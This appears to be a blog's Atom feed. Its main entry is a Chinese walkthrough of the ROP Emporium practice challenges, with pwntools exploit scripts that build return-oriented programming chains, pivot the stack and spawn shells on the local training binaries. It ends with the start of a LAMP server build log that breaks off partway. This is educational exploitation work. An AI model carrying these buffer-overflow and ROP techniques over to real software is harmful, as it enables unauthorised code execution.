<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Chumen77&#39;s Blog</title>
  
  <subtitle>永远相信美好的事情即将发生！</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://chumen77.xyz/"/>
  <updated>2020-04-15T14:13:36.702Z</updated>
  <id>http://chumen77.xyz/</id>
  
  <author>
    <name>chumen77</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ropemporium 通关记录</title>
    <link href="http://chumen77.xyz/2020/04/13/Ropemporium%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/04/13/Ropemporium通关记录/</id>
    <published>2020-04-13T04:32:06.614Z</published>
    <updated>2020-04-15T14:13:36.702Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ropemporium-通关记录"><a href="#Ropemporium-通关记录" class="headerlink" title="Ropemporium 通关记录"></a>Ropemporium 通关记录</h1><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><p>题目给了提示，32的buf却可以填充50个字节。并且接受用的是fgets，这个函数不用担心空字节。</p><pre><code class="c">int ret2win(){  printf(&quot;Thank you! Here&#39;s your flag:&quot;);  return system(&quot;/bin/cat flag.txt&quot;);}</code></pre><p>并且存在漏洞函数。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><h4 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./ret2win32&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 44 + p32(0x08048659)io.sendline(payload)io.interactive()</code></pre><h4 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./ret2win&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 40 + p64(0x00000400811)io.sendline(payload)io.interactive()</code></pre><h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><h3 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h3 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int usefulFunction(){  return system(&quot;/bin/ls&quot;);}</code></pre><p>后门函数变成了这样，但是可以看到有cat flag的字符串。这样只需要控制system的参数即可。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aPvOxL.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/qQOFlI.png" srcset="/img/loading.gif" alt></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><h4 id="32位："><a href="#32位：" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./split32&#39;)key = 0x0804A030 # /bin/cat flag.txt&#39;io.recvuntil(&#39;&gt;&#39;)offset = 44payload = &#39;a&#39; * offset + p32(0x08048657) + p32(0x0804A030)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位："><a href="#64位：" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./split&#39;)io.recvuntil(&#39;&gt;&#39;)key = 0x00601060 # /bin/cat flag.txt&#39;offset = 40pop_rdi_ret = 0x0000000000400883payload = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(key) + p64(0x00000400810) io.sendline(payload)io.interactive()</code></pre><h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><h3 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">void __noreturn usefulFunction(){  callme_three(4LL, 5LL, 6LL);  callme_two(4LL, 5LL, 6LL);  callme_one(4LL, 5LL, 6LL);  exit(1);}</code></pre><p>这个是关键函数，但是其是用到了给的so文件，然后ida来分析so文件。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/FgKhVy.png" srcset="/img/loading.gif" alt><br>找到以后发现应该是按照顺序调用<code>callme-one，callme-two，callme-three</code>需要注意其参数都要是1，2，3.当初程序中给的是4，5，6 需要想办法来换掉这个参数。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-1"><a href="#32位：-1" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./callme32&#39;)io.recvuntil(&#39;&gt;&#39;)offset = 44callme_one = 0x080485C0callme_two = 0x08048620callme_three = 0x080485B0pop3_ret = 0x080488a9payload = &#39;a&#39; * offset + p32(callme_one) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_two) + p32(pop3_ret) + p32(1) + p32(2) + p32(3)payload += p32(callme_three) + p32(0xdeadbeef) + p32(1) + p32(2) + p32(3)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>其中<code>pop3_ret</code> 是用来保持栈平衡的，且站的位置函数的返回地址。还有需要注意的问题是：<br><img src="http://qiqianyun.chumen77.xyz/uPic/9PV8oL.png" srcset="/img/loading.gif" alt><br>注意填充以后的返回地址填的时候，通常填的是代码段的数据，但是这里汇编是<code>call</code>所以在填的时候，应该是填充其plt的地址。<br><img src="http://qiqianyun.chumen77.xyz/uPic/HxXaWe.png" srcset="/img/loading.gif" alt></p><h4 id="64位：-1"><a href="#64位：-1" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./callme&#39;)io.recvuntil(&#39;&gt;&#39;)offset = 40callme_one = 0x00401850callme_two = 0x000401870callme_three = 0x00401810pop3_ret = 0x0000000000401ab0payload = &#39;a&#39; * offset + p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_one)payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_two)payload += p64(pop3_ret) + p64(1) + p64(2) + p64(3) + p64(callme_three)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><p>利用 <code>0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret</code>这个gadget来控制参数。</p><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h3 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题跟前面第2题很像，但是就是没有给你<code>cat flag</code> 的字符串了。需要自己用程序的gadget来构造。思路也就是进行rop把<code>/bin/sh</code>往bss段上写,然后接着拿shell就好了。</p><pre><code>ROPgadget --binary ./write4 --only &quot;mov|pop|ret&quot;</code></pre><p><strong>查好用的gadgets：</strong><br><img src="http://qiqianyun.chumen77.xyz/uPic/pY6tBk.png" srcset="/img/loading.gif" alt><br>利用这即可就可以了，32位的类似。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-2"><a href="#32位：-2" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./write432&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./write432&#39;)# bin_sh = elf.search(&#39;/bin/cat&#39;).next()offset = 44bss = 0x804A06C-0x10pop_edi_pop_ebp_ret = 0x080486dasystem = 0x8048430key = 0x08048670 #mov dword ptr [edi], ebp ; retpayload = &#39;a&#39; * offset + flat([pop_edi_pop_ebp_ret,bss,&#39;sh\x00\x00&#39;,key,system,0xdeadbeef,bss])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-2"><a href="#64位：-2" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./write4&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./write4&#39;)# bin_sh = elf.search(&#39;/bin/cat&#39;).next()offset = 40bss = 0x601090-0x10key1 = 0x0000000000400820# mov qword ptr [r14], r15 ; retkey2 = 0x0000000000400890# pop r14 ; pop r15 ; retkey3 = 0x0000000000400893#pop rdi ; retsystem = 0x000004005E0payload = &#39;a&#39; * offset + flat([key2,bss,&#39;/bin/sh\x00&#39;,key1,key3,bss,system])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h3 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h3><p>这个题目跟前一个write4十分的相似，但是其过滤了个别字符：<br><img src="http://qiqianyun.chumen77.xyz/uPic/C2HXoN.png" srcset="/img/loading.gif" alt><br>会将其替换为<code>0xEB</code>，个人解决办法就是在bss段写好被程序处理过的字符串后，在用xor的gadgets来重新改回来，为了便于利用，32位和64位都是构造<code>system(sh)</code>来拿的shell。<br>例子：<br><img src="http://qiqianyun.chumen77.xyz/uPic/4tnNv7.png" srcset="/img/loading.gif" alt><br>传过去的是<code>sh\x00\x00\x00\x00\x00\x00\x00</code> 到bss是这个情况，然后去找xor的gadget：<br><img src="http://qiqianyun.chumen77.xyz/uPic/4OvcwS.png" srcset="/img/loading.gif" alt><br>其中注意这是以一个byte来进行xor的，然后这个图xor的倒数第一条语句，**其中的是dh，这个是edx的高位。r14b是r14的低位也是一个byte的字节单位。<br>这个题目在gdb调试exp时会发现有比较便捷的办法。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-3"><a href="#32位：-3" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./badchars32&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./badchars32&#39;)key1 = 0x08048893# mov dword ptr [edi], esi ; retkey2 = 0x08048899# pop esi ; pop edi ; retkey3 = 0x08048461# pop ebx ; retbss = 0x804A06C-10key4 = 0x08048897# pop ecx ; retkey5 = 0x08048890#xor byte ptr [ebx], cl ; retsys = 0x080484E0offset = 44payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00&#39;,bss,key1,key3,bss,key4,0x98,key5,sys,0xdeadbeef,bss])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-3"><a href="#64位：-3" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./badchars&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./badchars&#39;)offset = 40bss = 0x6010B0key1 = 0x0000000000400b34# mov qword ptr [r13], r12 ; retkey2 = 0x0000000000400b3b# pop r12 ; pop r13 ; retkey3 = 0x0000000000400b39#pop rdi ; retkey4 = 0x0000000000400b30#xor byte ptr [r15], r14b ; retkey5 = 0x0000000000400b40#pop r14 ; pop r15 ; retsystem = 0x004006F0payload = &#39;a&#39; * offset + flat([key2,&#39;sh\x00\x00\x00\x00\x00\x00&#39;,bss,key1,key5,0x98,bss,key4,key3,bss,system])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><p>这个题目还是跟write4很相似，但是找可用的gadget是，比较难找。需要想尽办法找各种gadget，然后叠加在一起成为需要的链。这个题突破口也就在：</p><pre><code>mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</code></pre><p>然后再去找ecx，edx相关的gadget，里面用到了xor和xchg等相关的gadget。<br>其中64位的找可用gadget，还需要控制一下深度：</p><pre><code>ROPgadget --binary ./fluff --depth 15 </code></pre><p>这样找出足够的gadget，以便自己试用。</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><h4 id="32位：-4"><a href="#32位：-4" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;io = process(&#39;./fluff32&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./fluff32&#39;)key1 = 0x080483e1# pop ebx ; retkey2 = 0x08048671# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; retkey3 = 0x0804867b# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; retbss = 0x804A06Ckey4 = 0x08048689#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; retkey5 = 0x08048693# mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; retsys = 0x8048430offset = 44payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;sh\x00\x00&#39;,key2,1,key3,1,key5,1,0,sys,0xdeadbeef,bss])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-4"><a href="#64位：-4" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;io = process(&#39;./fluff&#39;)io.recvuntil(&#39;&gt;&#39;)elf = ELF(&#39;./fluff&#39;)key1 = 0x0000000000400832# pop r12 ; mov r13d, 0x604060 ; retkey2 = 0x0000000000400822#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; retkey3 = 0x000000000040082f#xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; retbss = 0x601090key4 = 0x0000000000400840##  : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; retkey5 = 0x000000000040084e# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; retkey6 = 0x00000000004008c3# pop rdi ; retsys = 0x4005E0offset = 40payload = &#39;a&#39; * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,&#39;/bin/sh\x00&#39;,key2,1,key3,1,key5,1,0,key6,bss,sys])raw_input(&quot;-&gt;&quot;)io.sendline(payload)io.interactive()</code></pre><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>这个题一看就是栈转移了。</p><h3 id="ida分析-5"><a href="#ida分析-5" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/zf6UXd.png" srcset="/img/loading.gif" alt><br>可以看到会给你泄漏一个堆地址，给你去栈转移。<br>接着看后门函数，发现这里call一个与libc连接的函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/rdxJnU.png" srcset="/img/loading.gif" alt></p><p>接着分析一下给定的so文件：<br><img src="http://qiqianyun.chumen77.xyz/uPic/BkFCTM.png" srcset="/img/loading.gif" alt></p><pre><code class="c">void __noreturn ret2win(){  system(&quot;/bin/cat flag.txt&quot;);  exit(0);}</code></pre><p>接着就有思路了，栈转移到给你的堆地址上，然后构造rop链：</p><ul><li>leak <code>foothold_function_got</code></li><li>算出给的libc基址，回到start，再次利用漏洞</li><li>构造jmp到ret2win的链即可<br>但是这个题目还是有技巧的，发现给你的堆地址其实跟这个libc的内存映射是很近的，并且每次差距也是固定的。那就可以直接分析so文件，来算取偏移，直接利用。</li></ul><p>根据给的堆地址和so文件映射基址：<br><img src="http://qiqianyun.chumen77.xyz/uPic/6yPkYR.png" srcset="/img/loading.gif" alt></p><h3 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h3><h4 id="32位：-5"><a href="#32位：-5" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot32&#39;)elf = ELF(&#39;./pivot32&#39;)libc = ELF(&#39;./libpivot32.so&#39;)foothold_function_plt = elf.plt[&#39;foothold_function&#39;]foothold_function_got = elf.got[&#39;foothold_function&#39;]put_plt = elf.plt[&#39;puts&#39;]key1 = 0x080486a8 #: leave ; retio.recvuntil(&#39;0x&#39;)leak = int(io.recv(8),16)print(&#39;leak_stack&#39;+ hex(leak))io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)payload = flat([0xdeadbeef,foothold_function_plt,put_plt,0x08048640,foothold_function_got])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;stack smash&#39;)io.recvuntil(&#39;&gt;&#39;)payload = 40 * &#39;a&#39; + p32(leak) +p32(key1)io.sendline(payload)io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)leak = u32(io.recv(4))print(&#39;leak&#39;+ hex(leak))ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)payload = &#39;a&#39; * 44 + p32(ret2win)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-5"><a href="#64位：-5" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot&#39;)elf = ELF(&#39;./pivot&#39;)libc = ELF(&#39;./libpivot.so&#39;)foothold_function_plt = elf.plt[&#39;foothold_function&#39;]foothold_function_got = elf.got[&#39;foothold_function&#39;]offset = libc.symbols[&#39;foothold_function&#39;] - libc.symbols[&#39;ret2win&#39;]put_plt = elf.plt[&#39;puts&#39;]key1 = 0x0000000000400a39 #: leave ; retkey2 = 0x0000000000400b73#pop rdi ; retkey3 = 0x0000000000400b02#xchg rax, rsp ; retkey4 = 0x0000000000400b00#pop rax ; retprint(&#39;offset:&#39; + hex(offset))io.recvuntil(&#39;0x&#39;)leak = int(io.recv(12),16)print(&#39;leak_stack&#39;+ hex(leak))io.recvuntil(&#39;now and it will land there&#39;)io.recvuntil(&#39;&gt;&#39;)payload = flat([foothold_function_plt,key2,foothold_function_got,put_plt,0x004008A0])raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;stack smash&#39;)io.recvuntil(&#39;&gt;&#39;)payload = 40 * &#39;a&#39; + p64(key4)+ p64(leak) + p64(key3)io.sendline(payload)io.recvuntil(&#39;foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so&#39;)leak = int(u64(io.recv(6).ljust(8,&#39;\x00&#39;)))print(&#39;leak&#39;+ hex(leak))ret2win = leak - libc.symbols[&#39;foothold_function&#39;] + libc.symbols[&#39;ret2win&#39;]print(&#39;ret2win&#39;+ hex(ret2win))# raw_input(&#39;-&gt;&#39;)io.recvuntil(&#39;&gt;&#39;)payload = &#39;a&#39; * 40 + p64(ret2win)io.sendline(payload)io.interactive()</code></pre><p>这个地方因为是fgets函数来获取字符串，其遇到换行就会结束，但是在找gadgat 的时候发现<code>leave ret</code>的这个gadget，地址都是有<code>0x0a</code>,所以只能更换gadget，来伪造栈。<br><img src="http://qiqianyun.chumen77.xyz/uPic/bZjoUw.png" srcset="/img/loading.gif" alt></p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><h4 id="32位：-6"><a href="#32位：-6" class="headerlink" title="32位："></a>32位：</h4><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot32&#39;)elf = ELF(&#39;./pivot32&#39;)offset = 44io.recvuntil(&#39;0x&#39;)leak1 = int(io.recv(8),16) + 1921272 + 0x000000967print(&#39;leak&#39;+ hex(leak1))raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + p32(leak1)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)io.sendline(payload)io.interactive()</code></pre><h4 id="64位：-6"><a href="#64位：-6" class="headerlink" title="64位："></a>64位：</h4><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./pivot&#39;)elf = ELF(&#39;./pivot&#39;)libc = ELF(&#39;./libpivot.so&#39;)offset = 40io.recvuntil(&#39;0x&#39;)leak1 = int(io.recv(12),16) + 3977456 + libc.symbols[&#39;ret2win&#39;]raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + p64(leak1)io.sendline(&#39;1&#39;)io.recvuntil(&#39;send your stack smash&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>这个题目就是再考ret2csu（64位的万能gadget），让你控制rdx（第三个参数的寄存器）为<code>0xdeadcafebabebeef</code> 就可以了。但是比较难搞的一点是：<br><img src="http://qiqianyun.chumen77.xyz/uPic/6lYgiL.png" srcset="/img/loading.gif" alt><br>在这个地方是call，所以这里应该填一个got的地址。不能是一个地址或者plt。因为<code>call 0xaaaaa</code> 汇编作用：</p><ul><li>push PC（也就是该汇编指令的下一个汇编指令的地址）</li><li><code>jmp [0xaaaaa]</code> 是该函数point指向的地址</li></ul><p>这个题目在call完每一个函数自带的正常库函数后，都将其got表清0。<br><img src="http://qiqianyun.chumen77.xyz/uPic/9we7VY.png" srcset="/img/loading.gif" alt><br>但是会发现上面还有一个动态链接<code>_DYNAMIC</code>的信息，跟进去：<br><img src="http://qiqianyun.chumen77.xyz/uPic/iTqAvV.png" srcset="/img/loading.gif" alt><br>发现一堆初始化用的函数。然后点进去第一个可以看看：<br><img src="http://qiqianyun.chumen77.xyz/uPic/GAIVGt.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/njC4qf.png" srcset="/img/loading.gif" alt><br>发现这里也没有对rdx进行处理，可以使用这个。现在就是确定一下哪里存放着<code>0x400560</code>，毫无疑问肯定是这个<code>_DYNAMIC</code>里，但是自己目前还不熟悉这个结构，看起来貌似是个结构体。先gdb跟入查看吧：<br><img src="http://qiqianyun.chumen77.xyz/uPic/wzkBKI.png" srcset="/img/loading.gif" alt><br>发现应该是<code>0x0600E38</code>。接下来的就简单了，传统的ret2csu。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;io = process(&#39;./ret2csu&#39;)elf = ELF(&#39;./ret2csu&#39;)offset = 40io.recvuntil(&#39;&gt;&#39;)key1 = 0x040089Akey2 = 0x000400880key3 = 0x0000600E38raw_input(&#39;-&gt;&#39;)payload = offset * &#39;a&#39; + flat([key1,0,1,key3,0,0,0xdeadcafebabebeef,key2,7*8*&#39;a&#39;,0x000004007B1])io.sendline(payload)io.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ropemporium-通关记录&quot;&gt;&lt;a href=&quot;#Ropemporium-通关记录&quot; class=&quot;headerlink&quot; title=&quot;Ropemporium 通关记录&quot;&gt;&lt;/a&gt;Ropemporium 通关记录&lt;/h1&gt;&lt;h2 id=&quot;ret2win&quot;&gt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="wp" scheme="http://chumen77.xyz/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://chumen77.xyz/2020/04/08/Lamp%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/04/08/Lamp搭建记录/</id>
    <published>2020-04-08T06:24:44.064Z</published>
    <updated>2020-04-15T14:13:21.104Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lamp搭建记录"><a href="#Lamp搭建记录" class="headerlink" title="Lamp搭建记录"></a>Lamp搭建记录</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="安装编译环境："><a href="#安装编译环境：" class="headerlink" title="安装编译环境："></a>安装编译环境：</h3><pre><code>yum -y install gcc*</code></pre><p>安装好后记得关闭防火墙和selinux</p><h3 id="准备软件包"><a href="#准备软件包" class="headerlink" title="准备软件包"></a>准备软件包</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/phSpwE.png" srcset="/img/loading.gif" alt><br>把这些安装包都放入虚拟机自定义的路径，等待使用。</p><h3 id="shell脚本批量解包"><a href="#shell脚本批量解包" class="headerlink" title="shell脚本批量解包"></a>shell脚本批量解包</h3><pre><code class="bash">#!/bin/bash/bin/ls *tar.gz &gt; ls.list/bin/ls *tgz &gt;&gt; ls.listfor a in `cat ls.list`do        /bin/tar -zxf $adonerm -rf ls.list</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/YX4fnr.png" srcset="/img/loading.gif" alt><br>然后开始一一的装包，注意需要按照一定的顺序来装的。</p><h2 id="python-devel"><a href="#python-devel" class="headerlink" title="python-devel"></a>python-devel</h2><pre><code class="bash">yum -y install python-devel</code></pre><p>安装python的底层环境。</p><pre><code class="bash">[root@localhost lamp1]# cd libxml2-2.9.1/[root@localhost libxml2-2.9.1]# ./configure --prefix=/usr/local/libxml2/[root@localhost libxml2-2.9.1]# make[root@localhost libxml2-2.9.1]# make install</code></pre><h2 id="libmcrypt"><a href="#libmcrypt" class="headerlink" title="libmcrypt"></a>libmcrypt</h2><p>提供一些加密算法：</p><pre><code class="bash">[root@localhost lamp1]# cd libmcrypt-2.5.8/[root@localhost libmcrypt-2.5.8]# ./configure --prefix=/usr/local/libmcrypt/[root@localhost libmcrypt-2.5.8]# make[root@localhost libmcrypt-2.5.8]# make install</code></pre><h2 id="libltdl"><a href="#libltdl" class="headerlink" title="libltdl"></a>libltdl</h2><pre><code class="bash">[root@localhost lamp1]# cd libmcrypt-2.5.8/libltdl/[root@localhost libltdl]# ./configure --enable-ltdl-install[root@localhost libltdl]# make[root@localhost libltdl]# make install</code></pre><h2 id="mhash"><a href="#mhash" class="headerlink" title="mhash"></a>mhash</h2><p>提供加密方式的扩展</p><pre><code class="bash">[root@localhost lamp1]# cd mhash-0.9.9.9/[root@localhost mhash-0.9.9.9]# ./configure</code></pre><h2 id="mcrypt"><a href="#mcrypt" class="headerlink" title="mcrypt"></a>mcrypt</h2><p>提供php相关的加密支持拓展库</p><pre><code class="bash">[root@localhost mcrypt-2.6.8]# LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib \./configure --with-libmcrypt-prefix=/usr/local/libmcrypt[root@localhost mcrypt-2.6.8]# make[root@localhost mcrypt-2.6.8]# make install</code></pre><h2 id="zlib"><a href="#zlib" class="headerlink" title="zlib"></a>zlib</h2><p>提供压缩用途的函数库</p><pre><code class="bash">[roott@localhost lamp1]# cd zlib-1.2.3/[root@localhost zlib-1.2.3]# ./configure[root@localhost zlib-1.2.3]# make[root@localhost zlib-1.2.3]# make install</code></pre><h2 id="libpng"><a href="#libpng" class="headerlink" title="libpng"></a>libpng</h2><pre><code class="bash">[root@localhost zlib-1.2.3]# cd ../[root@localhost lamp1]# cd libpng-1.2.31/[root@localhost libpng-1.2.31]# ./configure --prefix=/usr/local/libpng[root@localhost libpng-1.2.31]# make [root@localhost libpng-1.2.31]# make install</code></pre><p>如果出现：</p><pre><code class="bash">/usr/bin/ld: //usr/local/lib/libz.a(crc32.o): relocation R_X86_64_32 against `.rodata&#39; can not be used when making a shared object; recompile with -fPIC</code></pre><p>解决办法 ： </p><pre><code class="bash">[root@localhost lamp1]# cd zlib-1.2.3 //进入zlib目录[root@localhost zlib-1.2.3]# ./configure[root@localhost zlib-1.2.3]# CFLAGS=&quot;-O3 -fPIC&quot; ./configure   --prefix=/usr/local/zlib/ #使用64位元的方法进行编译[root@localhost zlib-1.2.3]# make[root@localhost zlib-1.2.3]# make install[root@localhost zlib-1.2.3]# make clean</code></pre><p>然后在重新来安装libpng即可。</p><h2 id="jpeg6"><a href="#jpeg6" class="headerlink" title="jpeg6"></a>jpeg6</h2><p>提供jpeg格式的图片</p><pre><code class="bash">[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/bin[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/lib[root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/include[root@localhost libpng-1.2.31]# mkdir -p /usr/local/jpeg6/man/man1</code></pre><pre><code class="bash">root@localhost lamp]# cd jpeg-6b/[root@localhost jpeg-6b]# ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static</code></pre><p>如果发生这样的报错：</p><pre><code class="bash">[root@localhost jpeg-6b]# make./libtool --mode=compile gcc -O2  -I. -c ./jcapimin.cmake: ./libtool：命令未找到make: *** [jcapimin.lo] 错误 127</code></pre><p>需要：</p><pre><code class="bash">[root@localhost jpeg-6b]# yum -y install libtool[root@localhost jpeg-6b]# cp /usr/share/libtool/config/config.guess .cp：是否覆盖&quot;./config.guess&quot;？ yes[root@localhost jpeg-6b]# make clean</code></pre><p>重新再来就好。</p><h2 id="freetype"><a href="#freetype" class="headerlink" title="freetype"></a>freetype</h2><p>字体库。</p><pre><code class="bash">[root@localhost freetype-2.3.5]# ./configure --prefix=/usr/local/freetype</code></pre><h2 id="GD"><a href="#GD" class="headerlink" title="GD"></a>GD</h2><p>给php提供图形拓展的库</p><pre><code class="bash">[root@localhost lamp]# mkdir /usr/local/gd2[root@localhost lamp]# cd 